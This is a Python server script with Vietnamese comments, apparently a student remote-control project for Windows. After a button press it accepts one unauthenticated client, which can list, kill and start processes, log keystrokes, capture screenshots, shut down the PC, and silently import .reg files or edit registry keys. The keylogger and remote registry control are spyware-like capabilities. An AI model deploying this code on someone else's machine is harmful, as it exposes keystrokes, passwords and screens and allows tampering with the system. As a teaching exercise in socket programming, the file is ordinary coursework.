import socket
import threading
import os
import winreg   
import sys

import tkinter as tk
from tkinter import messagebox
import pyautogui
from PIL import Image, ImageTk

from pynput.keyboard import Listener
import logging

import psutil
import subprocess
from subprocess import Popen,CREATE_NEW_CONSOLE,CREATE_NO_WINDOW

HOST = socket.gethostbyname(socket.gethostname()) # Lấy địa chỉ ID theo host name của máy
PORT = 5050
HEADER = 64
FORMAT = 'utf-8'
ADDR = (HOST,PORT)
DIR = os.path.dirname(__file__)

"""Tạo socket SERVER"""
SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

"""Gửi dữ liệu qua client"""
def send(client,msg):
    """Gửi dữ liệu thành 2 phần: Độ dài của dữ liệu và dữ liệu"""
    """Mã hoá dữ liệu với format là utf_8"""
    message = msg.encode(FORMAT)
    """Lấy độ dài của dữ liệu"""
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    try:
        """Gửi độ dài dài của dữ liệu"""
        client.send(send_length)
        
        """Gửi dữ liệu đi"""
        client.send(message)
    except socket.error:
        raise socket.error

"""Hàm nhận dữ liệu từ client"""
def receive(conn):
    """Nhận theo protocol là nhận độ dài của dữ liệu trước 64 bytes"""
    """Sau đó nhận dữ liệu dựa trên độ dài vừa nhận""" 
    msg = ""
    try:
        """Nhận độ dài dữ liệu"""
        msg_length = conn.recv(HEADER).decode(FORMAT)
    except socket.error:
        raise socket.error
    else:   
        if msg_length:
            msg_length = int(msg_length)
            """Nhận dữ liệu theo đúng độ dài đã nhận"""
            msg = conn.recv(msg_length).decode(FORMAT)
        return msg    
    
"""Hàm xử lí yêu cầu process running của client"""  
def process(conn):
    """Hàm để xem process đang chạy của server"""
    def xem(conn):
        list_process = []
        countProcess = 0
        for proc in psutil.process_iter():
            countProcess += 1
            proc_dict = proc.as_dict(['name','pid','num_threads'])
            list_process.append(proc_dict)  
                   
        """Gửi process qua client"""
        send(conn,str(countProcess))
        for proc in list_process:
            name = proc['name']
            send(conn,name)
            id = proc['pid']
            send(conn,str(id))
            threads = proc['num_threads']
            send(conn,str(threads))
    
    """Hàm để diệt 1 process bằng ID"""    
    def kill(conn):
        def killID(conn):
            msg = receive(conn)
            success = False
            if msg:
                for proc in psutil.process_iter():
                    if str(proc.pid) == msg:
                        try:
                            proc.kill()
                            send(conn,"Đã diệt Process")
                        except psutil.Error:
                            send(conn,"Lỗi")
                        else:
                            success = True
                            break
                
            if success == False:
                send(conn,"Không tìm thấy chương trình")
                return 
            
        while True:
            msg = receive(conn) 
            if msg == "QUIT":
               break
            else:
                killID(conn) 
    """Hàm để bắt đầu 1 process bằng tên"""
    def start(conn):
        while True:
            msg = receive(conn)
            if msg=="QUIT":
                break 
            elif msg == "STARTID":
                name = receive(conn)
                if name: 
                    name+=".exe"
                    try:
                        Popen([name],creationflags=CREATE_NEW_CONSOLE)
                        send(conn,"Process đã được bật")
                    except:
                        send(conn,"Lỗi") 
                else:        
                    send(conn,"Lỗi") 
    
    """Hàm nhận và xử lí yêu cầu của client"""        
    while True:
        ss = receive(conn)
        switcher={
            "XEM":xem,
            "KILL":kill,
            "START":start,
        }
        if ss == "QUIT":
            return
        func = switcher.get(ss, lambda args: "QUIT")
        func(conn)

"""Hàm xử lí yêu cầu app running"""
def application(conn):
    """Hàm để xem app đang chạy của server"""
    def xem(conn):
        list_process = []
        countProcess = 0
        str_list = []
        cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        for line in proc.stdout:
            if not line.decode()[0].isspace():
                countProcess += 1
                str_list.append(line.decode().rstrip())

        str_list.pop(0)
        str_list.pop(0)
        for i in str_list:
            id = i.rsplit(' ',1)
            proc = psutil.Process(int(id[1]))
            proc_dict = proc.as_dict(['name','pid','num_threads'])
            list_process.append(proc_dict)
        
        """Gửi trả danh sách các chương trình đang chạy cho client"""
        send(conn,str(countProcess - 2))
        for proc in list_process:
            name = proc['name']
            send(conn,name)
            id = proc['pid']
            send(conn,str(id))
            threads = proc['num_threads']
            send(conn,str(threads))
            
    """Hàm để diệt app của server"""    
    def kill(conn):
        """Hàm diệt theo ID"""
        def killID(conn):
            """Nhận app ID từ client"""
            msg = receive(conn)
            success = False
            if msg:
                """Tìm app trong tất cả process bằng ID"""
                for proc in psutil.process_iter():
                    """Nếu tìm thấy chương trình thì sẽ diệt chương trình"""
                    if str(proc.pid) == msg:
                        try:
                            """Diệt thành công thì gửi trả thông báo"""
                            proc.kill()
                            send(conn,"Đã diệt Process")
                        except psutil.Error:
                            send(conn,"Lỗi")
                        else:
                            success = True
                            break
                        
            """Không tìm thấy chương trình thì gửi thông báo cho client"""
            if success == False:
                send(conn,"Không tìm thấy chương trình")
                return 
            
        """Hàm xử lí yêu cầu của client để diệt app"""    
        
        while True:
            msg = receive(conn) 
            if msg == "QUIT":
                break
            else:
                killID(conn)

    """Hàm để bắt đầu 1 app bằng tên"""
    def start(conn):
        while True:
            msg = receive(conn)
            if msg=="QUIT":
                break
            elif msg == "STARTID":
                name = receive(conn) 
                if name: 
                    name+=".exe"
                    try:
                        """Nếu bật thành công thì gửi thông báo tới client"""
                        Popen([name],creationflags=CREATE_NEW_CONSOLE)
                        send(conn,"Process đã được bật")
                    except:
                        send(conn,"Lỗi") 
                else:        
                    send(conn,"Lỗi") 
                    
                    
    """Hàm xử lí yêu cầu của client"""                
    while True:
        ss = receive(conn)
        switcher={
            "XEM":xem,
            "KILL":kill,
            "START":start,
        }
        if ss == "QUIT":
            return
        func = switcher.get(ss, lambda args: "QUIT")
        func(conn)

"""Hàm xử lí keystroke của server"""
def key_log(conn):
    """Hàm bắt sự kiện bàn phím ghi vào file keyLog.txt"""
    def get_keys(stop):
        def writeFile(key):
            with open(DIR + "\\keyLog.txt","a") as f:
                k= str(key).replace("'","") 
                if k.find("backspace") > 0:
                    f.write("Backspace")
                elif k.find("space") > 0:
                    f.write(" ")
                elif k.find("enter") > 0:
                    f.write("Enter\n")
                elif k.find("tab") > 0:
                    f.write("Tab\t")
                elif k.find("x") > 0:
                    f.write("")
                elif k.find("Key") == -1:
                    f.write(k)  
                
        def on_press(key):
            return
        def on_release(key):
            if key:
                writeFile(key) 
                return False
        while True:
            with Listener(on_press=on_press,on_release=on_release) as listener:
                listener.join()
            if stop():
                break
    
    """Hàm in phím gửi các phím đã bấm qua cho client"""       
    def printKeys(conn):
        if os.path.isfile(DIR + "\\keyLog.txt"):  
            s = ""
            with open(DIR + "\\keyLog.txt","r") as file:
                s = file.read()
            with open(DIR + "\\keyLog.txt","w") as file:
                file.write("")
            if s == "":
                s = "\0"
            """Đọc từ file keyLog.txt lưu vào biến s gửi qua cho client"""
            send(conn, s)
        else:
            with open(DIR + "\\keyLog.txt","w") as file:
                file.write("")
            send(conn, "\0")
    
    """Hàm bắt đầu hook key: Tạo 1 luồng mới để bắt sự kiện"""          
    def hookKey():
        global stop_threads,t
        stop_threads = False
        t = threading.Thread(target= get_keys,args=(lambda : stop_threads, ))
        t.start()
        with open("keyLog.txt","w") as f:
            f.write("")
    
    """Hàm tắt hook key: Huỷ luồng mà hook key tạo ra"""    
    def unHook():   
        global stop_threads
        stop_threads = True
        t.join() 
        with open(DIR + "\\keyLog.txt","w") as f:
            f.write("")
    
    """Nhận yêu cầu từ client và xử lí"""
    while True:
        ss = receive(conn)
        if ss == "PRINT":
            printKeys(conn)
        elif ss == "HOOK":
            hookKey()
        elif ss == "UNHOOK":
            unHook()
        elif ss == "QUIT":
            return        

"""Hàm chụp màn hình"""
def takeScreenshot(conn):
    """Chụp màn hình"""
    img = pyautogui.screenshot()
    
    """Lấy độ dài của bytes hình ảnh"""
    length_img = len(img.tobytes())
    
    """Gửi lần lượt độ dài bytes, kích thước, với chế độ của hình ảnh cho client"""
    send(conn,str(length_img))
    send(conn,str(img.size))
    send(conn,str(img.mode))
    
    """Gửi toàn bộ bytes hình ảnh qua cho client"""
    conn.send(img.tobytes())
  
"""Hàm xử lí yếu cầu chụp màn hình của server"""
def take_pic(conn):
    while True:
        ss = receive(conn)
        if ss == "TAKE":
            takeScreenshot(conn)
        elif ss == "QUIT":
            return

"""Hàm tắt máy của server"""
def shutdown(conn): 
    os.system("shutdown /s /t 5")

"""Hàm xử lí yêu cầu REG của client"""
def REG(conn):
    """Nhận nội dung reg"""
    s = receive(conn)
    with open(DIR + "\\fileReg.reg","w") as f:
        f.write(s)
    
    check = True
    REG_PATH = DIR + "\\fileReg.reg"  
    cmd = f"regedit.exe /s \"{REG_PATH}\""
    
    """Chỉnh sửa reg của máy server"""
    try:
        process = Popen(cmd,shell=True,creationflags = CREATE_NO_WINDOW)
        process.wait(20)
        process.kill()
    except psutil.Error as e:
        check = False
    finally:
        if check == True:
            """Thành công"""
            send(conn,"Sửa thành công")
        else:
            """Thất bại"""
            send(conn,"Sửa thất bại")

def baseRegistryKey(link):
    a = None
    if len(link.split("\\",1)) >= 0:
        link = link.split("\\",1)[0].upper()
        
        if link == "HKEY_CLASSIES_ROOT":
            a = winreg.HKEY_CLASSES_ROOT
        elif link == "HKEY_CURRENT_USER":
            a = winreg.HKEY_CURRENT_USER
        elif link == "HKEY_LOCAL_MACHINE":
            a = winreg.HKEY_LOCAL_MACHINE
        elif link == "HKEY_USERS":
            a = winreg.HKEY_USERS
        elif link == "HKEY_CURRENT_CONFIG":
            a = winreg.HKEY_CURRENT_CONFIG
             
    return a

"""Hàm tạo key con"""
def CreateSubKey(key,sub_key):
    winreg.CreateKeyEx(key, sub_key, reserved=0, access=winreg.KEY_WRITE)
    return

"""Hàm xoá key"""
def deletekey(key,sub_key):
    def delete_sub_key(key0, current_key):
        open_key = winreg.OpenKey(key0, current_key, 0, winreg.KEY_ALL_ACCESS)
        info_key = winreg.QueryInfoKey(open_key)
        for x in range(0, info_key[0]):
            sub_key = winreg.EnumKey(open_key, 0)
            try:
                winreg.DeleteKey(open_key, sub_key)
            except OSError:
                delete_sub_key(key0, "\\".join([current_key,sub_key]))

        winreg.DeleteKey(open_key, "")
        open_key.Close()
        return
    try: 
        delete_sub_key(key,sub_key)
    except:
        return "Lỗi"
    else:
        return "Xóa key thành công"
    
"""Hàm lấy giá trị"""
def getvalue(key,sub_key,value_name):
    try:
        key = winreg.OpenKeyEx(key,sub_key,reserved=0, access=winreg.KEY_READ)
    except OSError as e:
        return "Lỗi"
    else:
        try:
            value = winreg.QueryValueEx(key, value_name)
        except OSError as e:
            return "Lỗi"
        else:
            s = ""
            if value[1] == winreg.REG_MULTI_SZ:
                for item in value[0]:
                    s += str(item) + " "
            elif value[1] == winreg.REG_BINARY:
                for item in value[0]:
                    s += str(item)
                    s += " "
            else:
                s = str(value[0])
            return s

"""Hàm ghi giá trị"""
def setvalue(key,sub_key,value_name,value,type_value):
    try:
        key = winreg.OpenKeyEx(key,sub_key,0,access = winreg.KEY_ALL_ACCESS)
    except:
        return "Lỗi"
    else:
        if type_value == "String":
            type_value = winreg.REG_SZ
        elif type_value == "Binary":
            type_value = winreg.REG_BINARY
        elif type_value == "DWORD":
            try:
                value = int(value)
            except ValueError:
                value = value
                pass
            type_value = winreg.REG_DWORD
        elif type_value == "QWORD":
            try:
                value = int(value)
            except ValueError:
                value = value
                pass
            type_value = winreg.REG_QWORD
        elif type_value == "Multi-string":
            value = value.split(" ")
            type_value =winreg.REG_MULTI_SZ
        elif type_value == "Expandable String":
            type_value = winreg.REG_EXPAND_SZ
        
        try:
            winreg.SetValueEx(key,value_name,0,type_value,value)
        except:
            return "Lỗi"
        else:
            return "Set value thành công"

"""Hàm xoá giá trị"""
def deletevalue(key,sub_key,value_name):
    try:
        key = winreg.OpenKeyEx(key,sub_key,0,access = winreg.KEY_ALL_ACCESS)
    except:
        return "Lỗi"
    else:
        try:
            winreg.DeleteValue(key,value_name)
        except:
            return "Lỗi"
        else:
            return "Xóa value thành công"
        
"""Hàm xử lí yêu cầu registry của client"""
def registry(conn):
    """Tạo file .reg"""
    with open(DIR + "\\fileReg.reg","w") as f:
        f.close()
    
    """Nhận yêu cầu của client"""
    while True: 
        ss = receive(conn)
        if ss == "REG":
            REG(conn)  
        elif ss == "SEND":
            option = receive(conn)
            link = receive(conn)
            value_name = receive(conn)
            value = receive(conn)
            type_value = receive(conn)
        
            link = fr'{link}'
            a = baseRegistryKey(link)
            sub_key = link.split("\\",1)[1]
            if not a:
                msg = "Lỗi"
            else:
                if option == "Create key":
                    CreateSubKey(a,sub_key)
                    msg = "Tạo key thành công"
                elif option == "Delete key":
                    msg = deletekey(a,sub_key)
                elif option == "Get value":
                    msg = getvalue(a,sub_key,value_name)
                elif option == "Set value":
                    msg = setvalue(a,sub_key,value_name,value,type_value)
                elif option == "Delete value":
                    msg = deletevalue(a,sub_key,value_name)
                else:
                    msg = "Lỗi"

            send(conn, msg)
        elif ss == "QUIT":
            return  
        
"""Hàm xử lí yếu cầu của client tham số là 1 socket type"""
def handle_client(conn):
    while True:
        msg = receive(conn)
        if msg == "KEYLOG":
            key_log(conn)
        elif msg == "SHUTDOWN":
            shutdown(conn)
            break
        elif msg == "REGISTRY":
            registry(conn)
        elif msg == "TAKEPIC":
            take_pic(conn)
        elif msg == "PROCESS":
            process(conn)
        elif msg == "APPLICATION":
            application(conn)
        elif msg == "QUIT":
            conn.close()
            break


"""Mở SERVER và nhận kết nối của client"""    
def accept_incoming_connections():
    try:
        SERVER.bind(ADDR)
        SERVER.listen(5)
        print(f"Listen on {HOST}")
        conn,addr = SERVER.accept()
    except socket.error:
        return
    else:  
        handle_client(conn)
 
def on_closing():
    if SERVER.fileno() != -1:
        SERVER.close()      
    root.destroy()  
    sys.exit()

"""Giao diện"""    
root = tk.Tk()
root.title("SERVER")
root.geometry("200x100")

connect = tk.Button(root,
          text= "Mở server",
          command = lambda : threading.Thread(target = accept_incoming_connections).start(),
          height =5,
          width = 10,
         )
connect.pack()

root.protocol("WM_DELETE_WINDOW",on_closing) 
root.mainloop()